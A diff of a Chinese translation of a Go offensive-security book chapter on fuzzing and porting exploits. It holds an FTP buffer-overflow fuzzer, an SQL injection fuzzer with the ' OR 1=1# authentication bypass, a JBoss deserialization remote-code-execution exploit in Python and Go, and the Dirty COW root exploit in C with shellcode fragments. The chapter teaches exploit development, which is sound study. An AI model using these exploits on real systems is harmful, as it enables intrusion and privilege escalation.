@@ -1,3 +1,5 @@
+# 第9章：编写并移植漏洞代码
+
 在前面的大多数章节中，使用Go创建基础的网络攻击。开发了原生的TCP，HTTP，DNS，SMB，数据库交互和被动数据包捕捉。
 
 本章侧重于识别和移植漏洞。首先，学习如何创建漏洞混淆器来发现程序的安全缺陷。然后，学习如何移植现有漏洞到Go中。最后，展示如何使用流行的工具来创建支持Go的shellcode。在本章结束时，应该对如何使用Go来发现缺陷以及如何使用它来编写和交付各种有效负载有了基本的了解。
@@ -10,7 +12,7 @@
 
 ### 缓冲区溢出混淆
 
-*Buffer overflows* 发生在用户在输入中提交的数据超过了程序能申请到的内存。例如，用户能够提交5000字符，而程序只能接受5个。若程序使用了错误的技术，其能允许用户将多余的数据写入到不是为这些数据准备的内存中，这种“溢出”会破坏存储在相邻内存位置中的数据，能让恶意用户偷偷地使程序崩溃或改变其逻辑流。
+_Buffer overflows_ 发生在用户在输入中提交的数据超过了程序能申请到的内存。例如，用户能够提交5000字符，而程序只能接受5个。若程序使用了错误的技术，其能允许用户将多余的数据写入到不是为这些数据准备的内存中，这种“溢出”会破坏存储在相邻内存位置中的数据，能让恶意用户偷偷地使程序崩溃或改变其逻辑流。
 
 缓冲区溢出对于从客户端接收数据的网络程序影响特别大。使用缓冲区溢出，客户端可能终端服务端的可用性，或执行远程代码。再重申下：除非得到允许，否则不要混淆系统或应用程序。另外，确保完全理解系统或程序崩溃的后果。
 
@@ -21,12 +23,12 @@
 **表9-1：** 在缓冲区溢出测试中的输入的值
 
 | 次数 | 输入 |
-| ---- | ---- |
-| 1    | A    |
-| 2    | AA   |
-| 3    | AAA  |
-| 4    | AAAA |
-|      | N个A |
+| :--- | :--- |
+| 1 | A |
+| 2 | AA |
+| 3 | AAA |
+| 4 | AAAA |
+|  | N个A |
 
 通过向一个易受攻击的函数发送大量输入，输入的长度最终会达到超过函数定义的缓冲区的大小，这会破坏程序的控制元素，例如其返回和指令指针。至此，程序或系统会崩溃。
 
@@ -44,8 +46,8 @@
 
 ```go
 var (
-	n int
-	s string 
+    n int
+    s string 
 )
 for n = 0; n < 25; n++ { 
     s += "A"
@@ -66,21 +68,21 @@ for n = 0; n < 25; n++ {
 
 ```go
 func main() {
-	for i := 0; i < 2500; i++ {
-		conn, err := net.Dial("tcp", "10.0.1.20:21") 
+    for i := 0; i < 2500; i++ {
+        conn, err := net.Dial("tcp", "10.0.1.20:21") 
         if err != nil {
-			log.Fatalf("[!] Error at offset %d: %s\n", i, err) 
+            log.Fatalf("[!] Error at offset %d: %s\n", i, err) 
         }
-		bufio.NewReader(conn).ReadString('\n')
-        
-		user := ""
-		for n := 0; n <= i; n++ {
-			user += "A" 
+        bufio.NewReader(conn).ReadString('\n')
+
+        user := ""
+        for n := 0; n <= i; n++ {
+            user += "A" 
         }
-        
-		raw := "USER %s\n" 
+
+        raw := "USER %s\n" 
         fmt.Fprintf(conn, raw, user)
-		bufio.NewReader(conn).ReadString('\n')
+        bufio.NewReader(conn).ReadString('\n')
 
         raw = "PASS password\n" 
         fmt.Fprint(conn, raw) 
@@ -88,11 +90,9 @@ func main() {
 
         if err := conn.Close(); err != nil { 
             log.Println("[!] Error at offset %d: %s\n", i, err)
-		} 
+        } 
     }
 }
-
-
 ```
 
 清单 9-1: 缓冲区溢出混淆器 （`/ch-9/ftp-fuzz/main.go`）
@@ -101,15 +101,13 @@ func main() {
 
 循环中的每次迭代，都会和目标FTP服务建立TCP连接。每当和FTP服务交互时，无论是初始化连接或后续的命令，都将服务器的响应作为一行单独显式读取。如此一来，代码会在等待TCP响应时阻塞，也就不会在数据包返回前过早地发送命令。然后用另一个 `for` 循环用之前介绍的方式构建 `A` 的字符串。使用外部循环的索引 `i` 来构建基于当前循环迭代的字符串长度，这样程序每次重新开始时，字符串长度都会增加1。 通过使用 `fmt.Fprintf(conn, raw, user)` 将该值写入到 `USER` 命令中。
 
-尽管可以在此时结束与FTP服务器的交互(毕竟，只混淆了 `USER` 命令)，但可以继续发送 `PASS` 命令来完成事务。最后，干净地关闭链接。
+尽管可以在此时结束与FTP服务器的交互\(毕竟，只混淆了 `USER` 命令\)，但可以继续发送 `PASS` 命令来完成事务。最后，干净地关闭链接。
 
 值得注意的有两点，其中，异常连接行为可能表明服务中断，这意味着潜在的缓冲区溢出：当第一次建立链接，然后链接关闭。如果在下次循环时不能建立链接，很可能出问题了。然后，检查服务是否由于缓冲区溢出而崩溃了。
 
 如果建立链接后不能关闭，这可能是远程FTP服务突然断开的异常行为，但是，可能不是由于缓冲区溢出造成的。先记录下异常情况，程序继续执行。
 
 图9-1是抓到的包，显示后续的每个 `USER` 命令的长度都在增加，确定代码按预期执行。
-
-<div align=center><img width = '640' height ='488' src ="https://github.com/YYRise/black-hat-go/raw/dev/ch-9/images/9-1.jpg"/></div>
 
 图9-1 Wireshark捕获到每次程序循环时 `USER` 命令增加一个字母
 
@@ -137,29 +135,29 @@ if(len(result) > 0) {
 
 伪代码中，变量username直接从HTTP参数中读取。该值未经过校验和验证。然后使用该值直接拼接到SQL查询语句中来构建查询字符串。程序查询数据库并检查结果。如果匹配到至少一条记录，则身份验证成功。只要提供的用户名由字母数字和某些特殊字符组成，该代码就应具有适当的行为。例如，提供用户名alice会是下面的安全查询：
 
-```SQL
+```sql
 SELECT * FROM users WHERE user = 'alice'
 ```
 
 但是，当用户名含单引号时会发生什么呢？提供用户名 `o'doyle` 会产生以下查询：
 
-```SQL
+```sql
 SELECT * FROM users WHERE user = 'o'doyle'
 ```
 
 这里的问题是后端数据库现在看到不平衡数量的单引号。注意前面查询的强调部分**`doyle`** ；后端数据库将其解释为SQL语法，因为它位于引号之外。当然，这是无效的SQL语法，并且后端数据库也不会处理。对于基于错误的SQL注入，会在HTTP响应中生成一个错误消息。消息本身将根据数据库而有所不同。MYSQL中会收到类型下面的的错误，可能还会包含其他详细信息，从而关闭查询本身：
 
-```SQL
+```sql
 You have an error in your SQL syntax
 ```
 
 尽管我们不会太深入地研究，但是现在可以操纵用户名输入来生成有效的SQL查询，该查询将绕过示例中的身份验证。输入 `' OR 1=1#`的用户名，恰好位于下面的SQL语句中：
 
-```SQL
+```sql
 SELECT * FROM users WHERE user = '' OR 1=1#'
 ```
 
-该输入在查询的末尾附加了逻辑 `OR`。该 `OR` 语句总是为真，因为1总是等于1。然后使用MySQL的注释（#）强制后端数据库忽略剩余的查询。这是有效的SQL语句。假设数据库中存在一行或多行数据，就可以绕过前面伪代码中的身份验证。
+该输入在查询的末尾附加了逻辑 `OR`。该 `OR` 语句总是为真，因为1总是等于1。然后使用MySQL的注释（\#）强制后端数据库忽略剩余的查询。这是有效的SQL语句。假设数据库中存在一行或多行数据，就可以绕过前面伪代码中的身份验证。
 
 #### 构建SQL注入混淆器
 
@@ -167,7 +165,7 @@ SELECT * FROM users WHERE user = '' OR 1=1#'
 
 首先要做的是分析目标请求。通过检查HTML源代码，使用拦截代理或使用Wireshark捕获网络数据包，可以确定为登录门户提交的HTTP请求类似于以下内容：
 
-```html
+```markup
 POST /WebApplication/login.jsp HTTP/1.1
 Host: 10.0.1.20:8080
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -184,59 +182,59 @@ username=someuser&password=somepass
 
 ```go
 func main() {
-	payloads := []string{
+    payloads := []string{
         "baseline", ")",
-		"(",
-		"\"",
-		"'", 
+        "(",
+        "\"",
+        "'", 
     }
-	sqlErrors := []string{ 
+    sqlErrors := []string{ 
         "SQL",
-		"MySQL", 
+        "MySQL", 
         "ORA-", 
         "syntax",
-	}
-	errRegexes := []*regexp.Regexp{} 
+    }
+    errRegexes := []*regexp.Regexp{} 
     for _, e := range sqlErrors {
-		wre := regexp.MustCompile(fmt.Sprintf(".*%s.*", e)) 
+        wre := regexp.MustCompile(fmt.Sprintf(".*%s.*", e)) 
         errRegexes = append(errRegexes, re)
-	}
+    }
     for _, payload := range payloads { 
         client := new(http.Client)
-		body := []byte(fmt.Sprintf("username=%s&password=p", payload)) 
+        body := []byte(fmt.Sprintf("username=%s&password=p", payload)) 
         req, err := http.NewRequest(
-			"POST", 
+            "POST", 
             "http://10.0.1.20:8080/WebApplication/login.jsp", 
             bytes.NewReader(body),
-		)
-		if err != nil {
-			log.Fatalf("[!] Unable to generate request: %s\n", err) 
-        }
-		req.Header.Add("Content-Type", "application/x-www-form-urlencoded") 
-        resp, err := client.Do(req)
-		if err != nil {
-			log.Fatalf("[!] Unable to process response: %s\n", err) 
-        }
-  		body, err = ioutil.ReadAll(resp.Body) 
+        )
         if err != nil {
-			log.Fatalf("[!] Unable to read response body: %s\n", err) 
+            log.Fatalf("[!] Unable to generate request: %s\n", err) 
         }
-		resp.Body.Close()
-		for idx, re := range errRegexes { 
-        	if re.MatchString(string(body)) {
-				fmt.Printf(
-					"[+] SQL Error found ('%s') for payload: %s\n", 
+        req.Header.Add("Content-Type", "application/x-www-form-urlencoded") 
+        resp, err := client.Do(req)
+        if err != nil {
+            log.Fatalf("[!] Unable to process response: %s\n", err) 
+        }
+          body, err = ioutil.ReadAll(resp.Body) 
+        if err != nil {
+            log.Fatalf("[!] Unable to read response body: %s\n", err) 
+        }
+        resp.Body.Close()
+        for idx, re := range errRegexes { 
+            if re.MatchString(string(body)) {
+                fmt.Printf(
+                    "[+] SQL Error found ('%s') for payload: %s\n", 
                     sqlErrors[idx],
-					payload,
-				)
-				break 
+                    payload,
+                )
+                break 
             }
-		} 
+        } 
     }
 }
 ```
 
-清单 9-2: SQL注入混淆器 (/ch-9/http_fuzz/main.go)
+清单 9-2: SQL注入混淆器 \(/ch-9/http\_fuzz/main.go\)
 
 代码首先定义要尝试的有效负载的切片。这是稍后将作为`username`请求参数的混淆列表。同样，定义了SQL错误关键字的字符串切片。将会在HTTP响应体中搜索这些值。存在任何一个值都是SQL出错的强有力的指标。也可以扩展这两个列表，但对于本例以及足够了。
 
@@ -244,13 +242,13 @@ func main() {
 
 接下来是该混淆器的核心逻辑。循环遍历每个有效负载，使用它们来构建一个适当的HTTP请求体，`username` 的值是当前的有效负载。使用该结果来构建针对登录表单的HTTP POST请求。然后设置 `Content-Type` 头，调用 `client.Do(req)` 发送请求。
 
-请注意，通过使用创建客户端和单个请求的长格式过程来发送请求，然后调用 `client.Do()`。 当然可以使用Go的 `http.PostForm()`函数来更简洁地实现。但是，更详细的技术可以更细粒度地控制HTTP的头。尽管本例中只设置了`Content-Type` 头，但是HTTP请求时设置额外的头的情况并不少见（例如 `User-Agent, Cookie` 等）。无法使用  `http.PostForm()`做到这一点，因此，用长路由会更容易地添加任何必须的HTTP头，尤其是对头本身进行混淆处理时。
+请注意，通过使用创建客户端和单个请求的长格式过程来发送请求，然后调用 `client.Do()`。 当然可以使用Go的 `http.PostForm()`函数来更简洁地实现。但是，更详细的技术可以更细粒度地控制HTTP的头。尽管本例中只设置了`Content-Type` 头，但是HTTP请求时设置额外的头的情况并不少见（例如 `User-Agent, Cookie` 等）。无法使用 `http.PostForm()`做到这一点，因此，用长路由会更容易地添加任何必须的HTTP头，尤其是对头本身进行混淆处理时。
 
 接下来，使用 `ioutil.ReadAll()` 读取HTTP响应体。有了响应体后就可以遍历所有的预编译的正则表达式了，测试响应主体中是否存在SQL 错误关键字。如果匹配到的话，就可能是一个SQL注入错误消息。程序会将负载和错误的详情输出到屏幕上，然后继续循环的下一个迭代。
 
 运行代码，以确认它可以通过易受攻击的登录表单成功识别出SQL注入漏洞。如果为 `username` 加上单引号，则会显示SQL的错误指示符，如下所示：
 
-```sh
+```bash
 $ go run main.go
 [+] SQL Error found ('SQL') for payload: '
 ```
@@ -271,13 +269,11 @@ $ go run main.go
 
 会发现无数种使用Go的标准库进行漏洞开发或移植的方法。对于我们来说，在一章中全面介绍这些包和用例是不现实的，建议通过 `https://golang.org/pkg/` 浏览Go的官方文档。文档内容丰富，有大量的好例子来帮助理解函数和包的用法。下面是一些在开发时可能会最感兴趣的包:
 
-**bytes** 提供低级字节操作
-**crypto** 实现各种对称和非对称加密和消息认证
-**debug** 检查各种文件类型的元数据和内容  
+**bytes** 提供低级字节操作 **crypto** 实现各种对称和非对称加密和消息认证 **debug** 检查各种文件类型的元数据和内容
 
 **encoding** 使用各种常见形式（例如二进制，十六进制，Base64等）对数据进行编码和解码
 
-**io** **and** **bufio** 从各种通用接口类型(包括文件系统、标准输出、网络连接等)读写数据
+**io** **and** **bufio** 从各种通用接口类型\(包括文件系统、标准输出、网络连接等\)读写数据
 
 **net** 通过使用各种协议（例如HTTP和SMTP）方便客户端与服务器的交互
 
@@ -285,7 +281,7 @@ $ go run main.go
 
 **syscall** 公开用于进行低级系统调用的接口
 
-**unicode**  使用UTF-16或UTF-8编码和解码数据
+**unicode** 使用UTF-16或UTF-8编码和解码数据
 
 **unsafe** 与操作系统进行交互时避免Go的类型安全检查很有用
 
@@ -293,38 +289,37 @@ $ go run main.go
 
 #### 移植Python代码漏洞
 
-在第一个例子中，将移植2015年发布的Java反序列化漏洞。该漏洞归类为几个CVE，它影响常见应用程序，服务器和库中Java对象的反序列化。反序列化库引入了此漏洞，该库无法在服务器端执行之前的验证输入（漏洞的常见原因）。我们将重点放在开发流行的Java Enterprise Edition应用程序服务器JBoss上。在 *https://github.com/roo7break/serialator/blob/master/serialator.py* 上，有一个Python脚本，其中包含可在多个应用程序中使用此漏洞的逻辑。清单9-3提供需要复制的逻辑。
+在第一个例子中，将移植2015年发布的Java反序列化漏洞。该漏洞归类为几个CVE，它影响常见应用程序，服务器和库中Java对象的反序列化。反序列化库引入了此漏洞，该库无法在服务器端执行之前的验证输入（漏洞的常见原因）。我们将重点放在开发流行的Java Enterprise Edition应用程序服务器JBoss上。在 [https://github.com/roo7break/serialator/blob/master/serialator.py](https://github.com/roo7break/serialator/blob/master/serialator.py) 上，有一个Python脚本，其中包含可在多个应用程序中使用此漏洞的逻辑。清单9-3提供需要复制的逻辑。
 
 ```python
 def jboss_attack(HOST, PORT, SSL_On, _cmd):
-	# The below code is based on the jboss_java_serialize.nasl script within Nessus 
+    # The below code is based on the jboss_java_serialize.nasl script within Nessus 
     """
-	This function sets up the attack payload for JBoss
-	"""
-	body_serObj = hex2raw3("ACED000573720032737--SNIPPED FOR BREVITY--017400")
-	
+    This function sets up the attack payload for JBoss
+    """
+    body_serObj = hex2raw3("ACED000573720032737--SNIPPED FOR BREVITY--017400")
+
     cleng = len(_cmd)
-	body_serObj += chr(cleng) + _cmd
-	body_serObj += hex2raw3("740004657865637571--SNIPPED FOR BREVITY--7E003A")
-	
+    body_serObj += chr(cleng) + _cmd
+    body_serObj += hex2raw3("740004657865637571--SNIPPED FOR BREVITY--7E003A")
+
     if SSL_On:
-		webservice = httplib2.Http(disable_ssl_certificate_validation=True) 
+        webservice = httplib2.Http(disable_ssl_certificate_validation=True) 
         URL_ADDR = "%s://%s:%s" % ('https',HOST,PORT)
-	else:
-		webservice = httplib2.Http()
-		URL_ADDR = "%s://%s:%s" % ('http',HOST,PORT)
-		headers = {"User-Agent":"JBoss_RCE_POC", 
+    else:
+        webservice = httplib2.Http()
+        URL_ADDR = "%s://%s:%s" % ('http',HOST,PORT)
+        headers = {"User-Agent":"JBoss_RCE_POC", 
                    "Content-type":"application/x-java-serialized-object--SNIPPED FOR BREVITY--", 
                    "Content-length":"%d" % len(body_serObj)
-		}
-	resp, content = webservice.request(
-		URL_ADDR+"/invoker/JMXInvokerServlet", 
+        }
+    resp, content = webservice.request(
+        URL_ADDR+"/invoker/JMXInvokerServlet", 
         "POST",
-		body=body_serObj,
-		headers=headers)
-	# print provided response.
-	print("[i] Response received from target: %s" % resp)
-
+        body=body_serObj,
+        headers=headers)
+    # print provided response.
+    print("[i] Response received from target: %s" % resp)
 ```
 
 清单 9-3: Python 序列化开发代码
@@ -337,55 +332,55 @@ def jboss_attack(HOST, PORT, SSL_On, _cmd):
 
 ```go
 func jboss(host string, ssl bool, cmd string) (int, error) {
-	serializedObject, err := hex.DecodeString("ACED0005737--SNIPPED FOR BREVITY--017400")
+    serializedObject, err := hex.DecodeString("ACED0005737--SNIPPED FOR BREVITY--017400")
     if err != nil {
         return 0, err
     }
-	serializedObject = append(serializedObject, byte(len(cmd)))
-	serializedObject = append(serializedObject, []byte(cmd)...)
-	afterBuf, err := hex.DecodeString("740004657865637571--SNIPPED FOR BREVITY--7E003A")
+    serializedObject = append(serializedObject, byte(len(cmd)))
+    serializedObject = append(serializedObject, []byte(cmd)...)
+    afterBuf, err := hex.DecodeString("740004657865637571--SNIPPED FOR BREVITY--7E003A")
     if err != nil {
         return 0, err
     }
-	serializedObject = append(serializedObject, afterBuf...)
+    serializedObject = append(serializedObject, afterBuf...)
 
     var client *http.Client var url string
-	if ssl {
-		client = &http.Client{ 
+    if ssl {
+        client = &http.Client{ 
             Transport: &http.Transport{
-				TLSClientConfig: &tls.Config{ 
+                TLSClientConfig: &tls.Config{ 
                     InsecureSkipVerify: true,
-				}, 
+                }, 
             },
-		}
-		url = fmt.Sprintf("https://%s/invoker/JMXInvokerServlet", host) 
+        }
+        url = fmt.Sprintf("https://%s/invoker/JMXInvokerServlet", host) 
     } else {
-		client = &http.Client{}
-		url = fmt.Sprintf("http://%s/invoker/JMXInvokerServlet", host) 
+        client = &http.Client{}
+        url = fmt.Sprintf("http://%s/invoker/JMXInvokerServlet", host) 
     }
-	req, err := http.NewRequest("POST", url, bytes.NewReader(serializedObject)) 
+    req, err := http.NewRequest("POST", url, bytes.NewReader(serializedObject)) 
     if err != nil {
         return 0, err
     }
     req.Header.Set(
         "User-Agent",
-		"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko") 
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko") 
     req.Header.Set(
-		"Content-Type",
-		"application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue")
+        "Content-Type",
+        "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue")
     resp, err := client.Do(req)
     if err != nil {
         return 0, err
     }
-	return resp.StatusCode, nil 
+    return resp.StatusCode, nil 
 }
 ```
 
-清单 9-4: 和原始Python序列化漏洞等效的Go代码 (/ch-9/jboss/main.go)
+清单 9-4: 和原始Python序列化漏洞等效的Go代码 \(/ch-9/jboss/main.go\)
 
 该代码几乎逐行复制了Python版本。基于此，我们将注释设置为与Python对应的注释一致，因此可以按照我们所做的更改。
 
-首先，通过定义序列化的Java对象 `byte` 切片来构造有效负载，并在操作系统命令之前对该部分进行硬编码。不像Python版本那样依赖于用户定义的逻辑将十六进制字符串转换为 `byte` 数组，Go版本使用 ` encoding/hex` 包中的 `hex.DecodeString()` 。接下来，确定操作系统命令的长度，然后将其和命令本身附加到有效负载中。通过将硬编码的十六进制尾部字符串解码到现有有效负载上，即可完成有效负载的构造。此代码比Python版本稍微冗长一些，因为我们有意添加了额外的错误处理，但也可以使用Go的标准编码包轻松解码十六进制字符串。 
+首先，通过定义序列化的Java对象 `byte` 切片来构造有效负载，并在操作系统命令之前对该部分进行硬编码。不像Python版本那样依赖于用户定义的逻辑将十六进制字符串转换为 `byte` 数组，Go版本使用 `encoding/hex` 包中的 `hex.DecodeString()` 。接下来，确定操作系统命令的长度，然后将其和命令本身附加到有效负载中。通过将硬编码的十六进制尾部字符串解码到现有有效负载上，即可完成有效负载的构造。此代码比Python版本稍微冗长一些，因为我们有意添加了额外的错误处理，但也可以使用Go的标准编码包轻松解码十六进制字符串。
 
 继续初始化HTTP客户端，如果需要，可将其配置为SSL通信，然后构建POST请求。在发送请求之前，需要设置必要的HTTP头，以便JBoss服务器正确地解释内容类型。注意，没有明确地设置 `Content-Length` 的HTTP头。这是因为Go的http包会自动为你做这些。最后，调用 `client.Do(request)` 发送攻击请求。
 
@@ -395,23 +390,21 @@ func jboss(host string, ssl bool, cmd string) (int, error) {
 
 表 9-2: 常用的 Python 和 Go 等效函数
 
-| Python                                  | Go                              | Notes                                                        |
-| --------------------------------------- | ------------------------------- | ------------------------------------------------------------ |
-| hex(*x*)                                | fmt.Sprintf("*%#x*", *x*)       | Converts an integer, x, to a lowercase hexadecimal string, prefixed with "0x". |
-| ord(*c*)                                | rune(*c*)                       | Used to retrieve the integer (int32) value of a single character. Works<br/> for standard 8-bit strings or multibyte Unicode. Note that rune is a built-in type in Go and makes working with ASCII and Unicode data fairly simple. |
-| chr(*i*) and unichr(*i*)                | fmt.Sprintf("*%+q*", rune(*i*)) | The inverse of ord in Python, chr and unichr return a string of length 1 for the integer input. In Go, you use the rune type and can retrieve it as a string by using the %+q format sequence. |
-| struct.pack(*fmt*, *v1*, *v2*, *. . .*) | binary.Write(*. . .*)           | Creates a binary representation of the data, formatted appropriately for type and endianness. |
-| struct.unpack(*fmt*, *string*)          | binary.Read(*. . .*)            | The inverse of struct.pack and binary. Write. Reads structured binary data into a specified format and type. |
-
-
+| Python | Go | Notes |
+| :--- | :--- | :--- |
+| hex\(_x_\) | fmt.Sprintf\("_%\#x_", _x_\) | Converts an integer, x, to a lowercase hexadecimal string, prefixed with "0x". |
+| ord\(_c_\) | rune\(_c_\) | Used to retrieve the integer \(int32\) value of a single character. Works  for standard 8-bit strings or multibyte Unicode. Note that rune is a built-in type in Go and makes working with ASCII and Unicode data fairly simple. |
+| chr\(_i_\) and unichr\(_i_\) | fmt.Sprintf\("_%+q_", rune\(_i_\)\) | The inverse of ord in Python, chr and unichr return a string of length 1 for the integer input. In Go, you use the rune type and can retrieve it as a string by using the %+q format sequence. |
+| struct.pack\(_fmt_, _v1_, _v2_, _. . ._\) | binary.Write\(_. . ._\) | Creates a binary representation of the data, formatted appropriately for type and endianness. |
+| struct.unpack\(_fmt_, _string_\) | binary.Read\(_. . ._\) | The inverse of struct.pack and binary. Write. Reads structured binary data into a specified format and type. |
 
 #### 移植C代码漏洞
 
-让我们把注意力从Python移到C上。C可以说是一种比Python可读性差的语言，但是C与Go的相似之处比Python多。从C移植漏洞比想象的要容易。为了演示，我们将为Linux移植一个本地特权升级漏洞。该漏洞称为 *Dirty COW*，与Linux内核的内存子系统中的竞争状况有关。此漏洞在披露时影响了大多数（如果不是全部）常见的Linux和Android发行版。此漏洞已得到修补，因此需要采取一些具体措施来重现以下示例。具体来说，需要配置具有易受攻击的内核版本的Linux系统。进行相关设置超出了本章的范围。但是，作为参考，我们使用内核版本为3.13.1的64位Ubuntu 14.04 LTS发行版。
+让我们把注意力从Python移到C上。C可以说是一种比Python可读性差的语言，但是C与Go的相似之处比Python多。从C移植漏洞比想象的要容易。为了演示，我们将为Linux移植一个本地特权升级漏洞。该漏洞称为 _Dirty COW_，与Linux内核的内存子系统中的竞争状况有关。此漏洞在披露时影响了大多数（如果不是全部）常见的Linux和Android发行版。此漏洞已得到修补，因此需要采取一些具体措施来重现以下示例。具体来说，需要配置具有易受攻击的内核版本的Linux系统。进行相关设置超出了本章的范围。但是，作为参考，我们使用内核版本为3.13.1的64位Ubuntu 14.04 LTS发行版。
 
-该漏洞利用程序的几种变体是公开可用的。可以在https://www.exploit-db.com/exploits/40616/找到要复制的副本。清单9-5显示了完整的原始漏洞代码，并对其进行了稍微的修改以提高可读性。
+该漏洞利用程序的几种变体是公开可用的。可以在[https://www.exploit-db.com/exploits/40616/找到要复制的副本。清单9-5显示了完整的原始漏洞代码，并对其进行了稍微的修改以提高可读性。](https://www.exploit-db.com/exploits/40616/找到要复制的副本。清单9-5显示了完整的原始漏洞代码，并对其进行了稍微的修改以提高可读性。)
 
-```C
+```c
 #include <stdio.h> 
 #include <stdlib.h> 
 #include <sys/mman.h> 
@@ -430,55 +423,55 @@ pthread_t pth1,pth2,pth3;
 char suid_binary[] = "/usr/bin/passwd";
 
 unsigned char sc[] = {
-	0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
     --snip--
-	0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
+    0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
 };
 unsigned int sc_len = 177;
 
 void *madviseThread(void *arg)
 {
-	char *str;
-	str=(char*)arg;
-	int i,c=0;
-	for(i=0;i<1000000 && !stop;i++) {
-		c+=madvise(map,100,MADV_DONTNEED); 
+    char *str;
+    str=(char*)arg;
+    int i,c=0;
+    for(i=0;i<1000000 && !stop;i++) {
+        c+=madvise(map,100,MADV_DONTNEED); 
     }
-	printf("thread stopped\n"); 
+    printf("thread stopped\n"); 
 }
 
 void *procselfmemThread(void *arg)
 {
-	char *str;
-	str=(char*)arg;
-	int f=open("/proc/self/mem",O_RDWR); int i,c=0;
-	for(i=0;i<1000000 && !stop;i++) {
+    char *str;
+    str=(char*)arg;
+    int f=open("/proc/self/mem",O_RDWR); int i,c=0;
+    for(i=0;i<1000000 && !stop;i++) {
         lseek(f,map,SEEK_SET);
-		c+=write(f, str, sc_len); 
+        c+=write(f, str, sc_len); 
     }
-	printf("thread stopped\n"); 
+    printf("thread stopped\n"); 
 }
 
 void *waitForWrite(void *arg) {
     char buf[sc_len];
-	for(;;) {
-		FILE *fp = fopen(suid_binary, "rb");
-        
+    for(;;) {
+        FILE *fp = fopen(suid_binary, "rb");
+
         fread(buf, sc_len, 1, fp);
 
         if(memcmp(buf, sc, sc_len) == 0) {
-			printf("%s is overwritten\n", suid_binary); 
+            printf("%s is overwritten\n", suid_binary); 
             break;
-		}
+        }
         fclose(fp);
-		sleep(1); 
+        sleep(1); 
     }
-    
+
     stop = 1;
-    
-	printf("Popping root shell.\n"); 
+
+    printf("Popping root shell.\n"); 
     printf("Don't forget to restore /tmp/bak\n");
-    
+
     system(suid_binary);
 }
 
@@ -495,7 +488,7 @@ int main(int argc,char *argv[]) {
     fstat(f,&st);
 
     printf("Size of binary: %d\n", st.st_size);
-	
+
     char payload[st.st_size]; 
     memset(payload, 0x90, st.st_size); 
     memcpy(payload, sc, sc_len+1);
@@ -503,25 +496,24 @@ int main(int argc,char *argv[]) {
     map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
 
     printf("Racing, this may take a while..\n");
-    
+
     pthread_create(&pth1, NULL, &madviseThread, suid_binary);
     pthread_create(&pth2, NULL, &procselfmemThread, payload);
     pthread_create(&pth3, NULL, &waitForWrite, NULL);
-    
+
     pthread_join(pth3, NULL);
 
     return 0; 
 }
-
 ```
 
 清单9-5 C语言编写的Dirty COW特权升级漏洞
 
-与其解释C代码逻辑的细节，不如先从整体上看一下，然后将其分块，逐行与Go版本进行比较。该漏洞利用可执行文件和可链接格式（ELF）定义了一些恶意的Shell代码，该代码可生成Linux Shell。通过创建多个线程来作为特权用户执行代码，这些线程调用各种系统函数来将我们的shellcode写入内存位置。最终，shellcode通过覆盖碰巧已设置了SUID位并属于root用户的二进制可执行文件的内容来利用此漏洞。在本例中，二进制文件是 */usr/bin/passwd*，通常非root用户不能覆盖该文件。但是，由于 *Dirty COW* 漏洞，可以在保留文件权限的同时将任意内容写入文件，从而实现了特权升级。
+与其解释C代码逻辑的细节，不如先从整体上看一下，然后将其分块，逐行与Go版本进行比较。该漏洞利用可执行文件和可链接格式（ELF）定义了一些恶意的Shell代码，该代码可生成Linux Shell。通过创建多个线程来作为特权用户执行代码，这些线程调用各种系统函数来将我们的shellcode写入内存位置。最终，shellcode通过覆盖碰巧已设置了SUID位并属于root用户的二进制可执行文件的内容来利用此漏洞。在本例中，二进制文件是 _/usr/bin/passwd_，通常非root用户不能覆盖该文件。但是，由于 _Dirty COW_ 漏洞，可以在保留文件权限的同时将任意内容写入文件，从而实现了特权升级。
 
 现在将C代码分解为易于理解的部分，并将每个部分与Go中的等价部分进行比较。请注意，Go代码专门尝试实现C代码的逐行复制。清单9-6是在C语言函数之外定义或初始化的全局变量，而清单9-7是在Go中定义或初始化的全局变量。
 
-```C
+```c
 void *map; 
 int f;
 int stop = 0;
@@ -533,83 +525,83 @@ pthread_t pth1,pth2,pth3;
 char suid_binary[] = "/usr/bin/passwd";
 
 unsigned char sc[] = {
-	0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 
+    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 
     --snip--
-	0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
+    0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
 };
 unsigned int sc_len = 177;
 ```
 
-清单 9-6:  C中的初始化
+清单 9-6: C中的初始化
 
-```Go
+```go
 var mapp uintptr
 var signals = make(chan bool, 2) 
 const SuidBinary = "/usr/bin/passwd"
 
 var sc = []byte{
-	0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 
+    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 
     --snip--
-	0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,
+    0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,
 }
 ```
 
-清单 9-7:  Go中的初始化
+清单 9-7: Go中的初始化
 
